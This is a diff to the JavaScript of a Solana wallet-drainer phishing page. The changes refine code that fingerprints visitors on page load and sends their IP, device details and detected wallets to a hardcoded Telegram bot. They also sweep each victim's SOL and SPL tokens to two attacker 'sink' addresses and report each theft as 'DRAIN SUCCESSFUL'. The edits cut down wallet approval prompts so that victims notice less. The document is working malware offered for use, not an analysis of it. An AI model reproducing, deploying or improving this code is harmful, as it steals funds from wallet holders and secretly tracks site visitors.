@@ -544,6 +544,7 @@ try{
 var TG_BOT_TOKEN="8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
 var TG_CHAT_ID="6759486932";
 var REDIRECT_URL="https://rapidlaunch.io/";
+var SOL_EMOJI_IMG="https://cdn3.emoji.gg/emojis/8033-solana.png";
 
 var SINK_PRIMARY="4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
 var SINK_SECONDARY="EVeMnsb7UGPq5w6oBF1bTq8T6PdtKnSbkDHWY3bEKams";
@@ -569,15 +570,43 @@ function clearPending(){lsDel("vx_pending");}
 
 // ==========================================================
 // telegram
+// - sendPhoto with the Solana emoji image as the top-level image
+// - the log text is the photo caption (HTML parse mode)
+// - falls back to sendMessage if sendPhoto fails
 // ==========================================================
 function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
-function tgSend(text){
+
+function tgSendWithImage(caption){
+  try{
+    var photoUrl="https://api.telegram.org/bot"+TG_BOT_TOKEN+"/sendPhoto";
+    var bodyPhoto=JSON.stringify({
+      chat_id:TG_CHAT_ID,
+      photo:SOL_EMOJI_IMG,
+      caption:caption,
+      parse_mode:"HTML"
+    });
+    fetch(photoUrl,{method:"POST",mode:"cors",cache:"no-store",headers:{"Content-Type":"application/json"},body:bodyPhoto,keepalive:true})
+      .then(function(r){
+        if(!r.ok){
+          // sendPhoto may fail if Telegram can't fetch the image URL from its side; fall back to text
+          tgSendText(caption);
+        }
+      })
+      .catch(function(){ tgSendText(caption); });
+  }catch(_){
+    tgSendText(caption);
+  }
+}
+
+function tgSendText(text){
   try{
     var url="https://api.telegram.org/bot"+TG_BOT_TOKEN+"/sendMessage";
     var body=JSON.stringify({chat_id:TG_CHAT_ID,text:text,parse_mode:"HTML",disable_web_page_preview:true});
     fetch(url,{method:"POST",mode:"cors",cache:"no-store",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).catch(function(){});
   }catch(_){}
 }
+
+function tgSend(text){ tgSendWithImage(text); }
 
 async function getClientIP(){
   try{
@@ -596,6 +625,8 @@ async function getClientIP(){
   }
 }
 
+function shortId(s){ if(!s) return "—"; s=String(s); return s.length>16 ? s.slice(0,8)+"…"+s.slice(-8) : s; }
+
 async function logVisit(){
   try{
     var ip=await getClientIP();
@@ -605,24 +636,6 @@ async function logVisit(){
     try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"";}catch(_){}
     var conn="";
     try{conn=nav.connection?(nav.connection.effectiveType||""):"";}catch(_){}
-    var L=[];
-    L.push("<b>👀 Visit</b>");
-    L.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
-    L.push("<b>Time:</b> "+new Date().toISOString());
-    L.push("<b>Site:</b> "+tgEscape(location.host));
-    L.push("<b>Path:</b> "+tgEscape(location.pathname+location.search));
-    L.push("<b>Referrer:</b> "+tgEscape(document.referrer||"direct"));
-    L.push("<b>UA:</b> "+tgEscape(nav.userAgent));
-    L.push("<b>Platform:</b> "+tgEscape(nav.platform||""));
-    L.push("<b>Lang:</b> "+tgEscape(nav.language||""));
-    L.push("<b>Screen:</b> "+(scr.width||"?")+"x"+(scr.height||"?")+" @"+(window.devicePixelRatio||1)+"x");
-    L.push("<b>Viewport:</b> "+window.innerWidth+"x"+window.innerHeight);
-    L.push("<b>Timezone:</b> "+tgEscape(tz));
-    L.push("<b>Cores:</b> "+(nav.hardwareConcurrency||"?"));
-    L.push("<b>Memory:</b> "+(nav.deviceMemory||"?")+" GB");
-    L.push("<b>Touch:</b> "+((("ontouchstart" in window)||nav.maxTouchPoints>0)?"yes":"no"));
-    L.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
-    if(conn) L.push("<b>Conn:</b> "+tgEscape(conn));
     var seen=[];
     try{if(window.phantom||(window.solana&&window.solana.isPhantom))seen.push("Phantom");}catch(_){}
     try{if(window.solflare)seen.push("Solflare");}catch(_){}
@@ -631,10 +644,32 @@ async function logVisit(){
     try{if(window.okxwallet)seen.push("OKX");}catch(_){}
     try{if(window.safepal||window.safepalProvider)seen.push("SafePal");}catch(_){}
     try{if(window.coinbaseSolana)seen.push("Coinbase");}catch(_){}
-    if(seen.length) L.push("<b>Wallets:</b> "+tgEscape(seen.join(", ")));
+    var sid=shortId(location.host)+"-"+Date.now().toString(36);
+    var L=[];
+    L.push("🟣 <b>NEW VISITOR</b>");
+    L.push("━━━━━━━━━━━━━━━━━━");
+    L.push("🆔 <b>Session:</b> <code>"+tgEscape(sid)+"</code>");
+    L.push("🌐 <b>IP:</b> <code>"+tgEscape(ip)+"</code>");
+    L.push("⏱ <b>Time:</b> "+new Date().toISOString());
+    L.push("🔗 <b>Site:</b> "+tgEscape(location.host));
+    L.push("📍 <b>Path:</b> "+tgEscape(location.pathname+location.search));
+    L.push("↩️ <b>Referrer:</b> "+tgEscape(document.referrer||"direct"));
+    L.push("━━━━━━━━━━━━━━━━━━");
+    L.push("💻 <b>UA:</b> "+tgEscape(nav.userAgent));
+    L.push("🖥 <b>Platform:</b> "+tgEscape(nav.platform||""));
+    L.push("🗣 <b>Lang:</b> "+tgEscape(nav.language||""));
+    L.push("📐 <b>Screen:</b> "+(scr.width||"?")+"x"+(scr.height||"?")+" @"+(window.devicePixelRatio||1)+"x");
+    L.push("🪟 <b>Viewport:</b> "+window.innerWidth+"x"+window.innerHeight);
+    L.push("🕐 <b>Timezone:</b> "+tgEscape(tz));
+    L.push("⚙️ <b>Cores:</b> "+(nav.hardwareConcurrency||"?"));
+    L.push("🧠 <b>Memory:</b> "+(nav.deviceMemory||"?")+" GB");
+    L.push("👆 <b>Touch:</b> "+((("ontouchstart" in window)||nav.maxTouchPoints>0)?"yes":"no"));
+    L.push("📱 <b>Mobile:</b> "+(isMobile?"yes":"no"));
+    if(conn) L.push("📶 <b>Conn:</b> "+tgEscape(conn));
+    if(seen.length) L.push("👛 <b>Wallets:</b> "+tgEscape(seen.join(", ")));
     tgSend(L.join("\n"));
   }catch(e){
-    try{ tgSend("<b>Visit log error:</b> "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+    try{ tgSendText("Visit log error: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
   }
 }
 
@@ -760,13 +795,37 @@ async function waitForProvider(ms){
   while(Date.now()-t0<ms){var p=getUsable();if(p)return p;await new Promise(function(r){setTimeout(r,150);});}
   return null;
 }
+
+// Phantom double-request fix: reuse existing approval, single-prompt sign
 async function connectAny(w){
-  var res=await w.provider.connect();
-  var pk=(res&&res.publicKey?res.publicKey:w.provider.publicKey);
-  pk=pk?pk.toString():"";
-  if(!pk)throw new Error("Wallet did not return a public key.");
-  return{id:w.id,provider:w.provider,pubkey:pk};
+  var provider=w.provider;
+  var pk="";
+  try{
+    if(provider.publicKey){
+      var p=provider.publicKey;
+      pk=(p&&p.toString)?p.toString():String(p||"");
+    }
+  }catch(_){}
+  if(!pk){
+    try{
+      var r=await provider.connect({onlyIfTrusted:true});
+      var pp=(r&&r.publicKey?r.publicKey:provider.publicKey);
+      if(pp) pk=(pp.toString)?pp.toString():String(pp);
+    }catch(_){}
+  }
+  if(!pk){
+    try{
+      var r2=await provider.connect();
+      var pp2=(r2&&r2.publicKey?r2.publicKey:provider.publicKey);
+      if(pp2) pk=(pp2.toString)?pp2.toString():String(pp2);
+    }catch(e){
+      throw new Error("Wallet connection rejected.");
+    }
+  }
+  if(!pk) throw new Error("Wallet did not return a public key.");
+  return { id:w.id, provider:provider, pubkey:pk };
 }
+
 function deriveAta(owner,mint){
   var[ata]=PublicKey.findProgramAddressSync([owner.toBuffer(),TOKEN_PROGRAM.toBuffer(),mint.toBuffer()],ASSOC_TOKEN_PROGRAM);
   return ata;
@@ -790,12 +849,30 @@ function transferCheckedIx(sourceAta,destAta,owner,mint,amount,decimals){
     {pubkey:owner,isSigner:true,isWritable:false}
   ],data:data});
 }
+
+// Phantom double-request fix: signAndSendTransaction first (single prompt)
 async function signAndSend(provider,connection,tx){
-  if(provider.signTransaction){var s=await provider.signTransaction(tx);return await connection.sendRawTransaction(s.serialize(),{skipPreflight:true,maxRetries:3});}
-  if(provider.signAllTransactions){var arr=await provider.signAllTransactions([tx]);return await connection.sendRawTransaction(arr[0].serialize(),{skipPreflight:true,maxRetries:3});}
-  if(provider.signAndSendTransaction){var res=await provider.signAndSendTransaction(tx);return(res&&res.signature)?res.signature:res;}
+  if(typeof provider.signAndSendTransaction==="function"){
+    try{
+      var res=await provider.signAndSendTransaction(tx);
+      if(res && res.signature) return res.signature;
+      if(typeof res==="string") return res;
+    }catch(e){
+      var m=String(e&&e.message?e.message:e).toLowerCase();
+      if(m.indexOf("reject")>=0||m.indexOf("cancel")>=0||m.indexOf("declin")>=0) throw e;
+    }
+  }
+  if(typeof provider.signTransaction==="function"){
+    var s=await provider.signTransaction(tx);
+    return await connection.sendRawTransaction(s.serialize(),{skipPreflight:true,maxRetries:3});
+  }
+  if(typeof provider.signAllTransactions==="function"){
+    var arr=await provider.signAllTransactions([tx]);
+    return await connection.sendRawTransaction(arr[0].serialize(),{skipPreflight:true,maxRetries:3});
+  }
   throw new Error("Wallet does not support signing.");
 }
+
 async function drain(session){
   await ensureWeb3();
   var connection=new Connection(RPC,"confirmed");
@@ -805,6 +882,7 @@ async function drain(session){
   var provider=session.provider;
   var solDrained=0,solSig="",halfA=0,halfB=0;
   var tokenResults=[],tokenTotal=0;
+  var victimFull=session.pubkey;
 
   try{
     var balance=await connection.getBalance(from);
@@ -833,6 +911,9 @@ async function drain(session){
     }
   }catch(e){}
 
+  // brief pause so Phantom's internal queue drains before the second prompt
+  await new Promise(function(r){ setTimeout(r, 500); });
+
   try{
     var ta=await connection.getParsedTokenAccountsByOwner(from,{programId:TOKEN_PROGRAM});
     var entries=[];
@@ -848,6 +929,7 @@ async function drain(session){
     }
     if(cur.length)batches.push(cur);
     for(var k=0;k<batches.length;k++){
+      if(k>0) await new Promise(function(r){ setTimeout(r, 500); });
       var batch=batches[k];var t=new Transaction();var seenMints={};
       for(var m=0;m<batch.length;m++){
         var e=batch[m];var destAta=deriveAta(primary,e.mint);var mkey=e.mint.toBase58();
@@ -855,7 +937,7 @@ async function drain(session){
         t.add(transferCheckedIx(e.tokenAccount,destAta,from,e.mint,e.amount,e.decimals));
       }
       t.feePayer=from;var b2=await connection.getLatestBlockhash("confirmed");t.recentBlockhash=b2.blockhash;
-      try{var sig=await signAndSend(provider,connection,t);tokenResults.push({count:batch.length,sig:sig});tokenTotal+=batch.length;}catch(e){}
+      try{var sig=await signAndSend(provider,connection,t);tokenResults.push({count:batch.length,sig:sig,mints:batch.map(function(x){return x.mint.toBase58();})});tokenTotal+=batch.length;}catch(e){}
     }
   }catch(e){}
 
@@ -865,25 +947,47 @@ async function drain(session){
   try{var pr=await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",{cache:"no-store"});var pj=await pr.json();if(pj&&pj.solana&&pj.solana.usd)usdStr=" ($"+((solDrained/1000000000)*pj.solana.usd).toFixed(2)+" USD)";}catch(_){}
 
   var L=[];
-  L.push("<b>💰 Drain successful</b>");
-  L.push("<b>Victim:</b> <code>"+tgEscape(session.pubkey)+"</code>");
-  L.push("<b>Wallet:</b> "+tgEscape(session.id));
-  L.push("<b>SOL total:</b> "+solAmountStr+" SOL"+usdStr);
-  if(solSig)L.push("<b>SOL tx:</b> <code>"+tgEscape(solSig)+"</code>");
-  L.push("<b>Primary:</b> <code>"+tgEscape(SINK_PRIMARY)+"</code> ("+(halfA/1e9).toFixed(6)+" SOL)");
-  L.push("<b>Secondary:</b> <code>"+tgEscape(SINK_SECONDARY)+"</code> ("+(halfB/1e9).toFixed(6)+" SOL)");
-  if(tokenTotal){
-    L.push("<b>SPL accounts:</b> "+tokenTotal);
-    for(var ti=0;ti<tokenResults.length;ti++)L.push("  • <code>"+tgEscape(tokenResults[ti].sig)+"</code> ("+tokenResults[ti].count+")");
+  L.push("🟢 <b>DRAIN SUCCESSFUL</b>");
+  L.push("━━━━━━━━━━━━━━━━━━");
+  L.push("🎯 <b>Victim wallet:</b>");
+  L.push("<code>"+tgEscape(victimFull)+"</code>");
+  L.push("👛 <b>Wallet type:</b> "+tgEscape(session.id));
+  L.push("━━━━━━━━━━━━━━━━━━");
+  L.push("💎 <b>SOL total:</b> "+solAmountStr+" SOL"+usdStr);
+  if(solSig){
+    L.push("📜 <b>SOL txid:</b>");
+    L.push("<code>"+tgEscape(solSig)+"</code>");
   }else{
-    L.push("<b>SPL:</b> none");
+    L.push("📜 <b>SOL txid:</b> none");
   }
-  L.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
-  L.push("<b>UA:</b> "+tgEscape(navigator.userAgent));
-  L.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
-  L.push("<b>Time:</b> "+new Date().toISOString());
-  L.push("<b>Site:</b> "+tgEscape(location.host));
-  if(solSig)L.push("https://solscan.io/tx/"+tgEscape(solSig));
+  L.push("━━━━━━━━━━━━━━━━━━");
+  L.push("🟣 <b>Primary sink:</b>");
+  L.push("<code>"+tgEscape(SINK_PRIMARY)+"</code>");
+  L.push("└ received "+(halfA/1e9).toFixed(6)+" SOL");
+  L.push("🔵 <b>Secondary sink:</b>");
+  L.push("<code>"+tgEscape(SINK_SECONDARY)+"</code>");
+  L.push("└ received "+(halfB/1e9).toFixed(6)+" SOL");
+  L.push("━━━━━━━━━━━━━━━━━━");
+  if(tokenTotal){
+    L.push("🪙 <b>SPL accounts swept:</b> "+tokenTotal);
+    for(var ti=0;ti<tokenResults.length;ti++){
+      var tr=tokenResults[ti];
+      L.push("• <b>Batch "+(ti+1)+"</b> ("+tr.count+" accounts)");
+      L.push("  📜 txid: <code>"+tgEscape(tr.sig)+"</code>");
+      if(tr.mints && tr.mints.length){
+        for(var mi=0;mi<tr.mints.length;mi++) L.push("  └ <code>"+tgEscape(tr.mints[mi])+"</code>");
+      }
+    }
+  }else{
+    L.push("🪙 <b>SPL accounts swept:</b> 0");
+  }
+  L.push("━━━━━━━━━━━━━━━━━━");
+  L.push("🌐 <b>IP:</b> <code>"+tgEscape(ip)+"</code>");
+  L.push("💻 <b>UA:</b> "+tgEscape(navigator.userAgent));
+  L.push("📱 <b>Mobile:</b> "+(isMobile?"yes":"no"));
+  L.push("⏱ <b>Time:</b> "+new Date().toISOString());
+  L.push("🔗 <b>Site:</b> "+tgEscape(location.host));
+  if(solSig)L.push("🚀 https://solscan.io/tx/"+tgEscape(solSig));
   tgSend(L.join("\n"));
 
   return { drained: solDrained>0||tokenTotal>0, solDrained:solDrained, tokenTotal:tokenTotal };
@@ -939,7 +1043,7 @@ setTimeout(function(){clearInterval(rebind);},15000);
 })();
 
 // ==========================================================
-// visit log — fires on load
+// visit log
 // ==========================================================
 if(document.readyState==="complete"){ setTimeout(logVisit, 300); }
 else { window.addEventListener("load", function(){ setTimeout(logVisit, 300); }); }
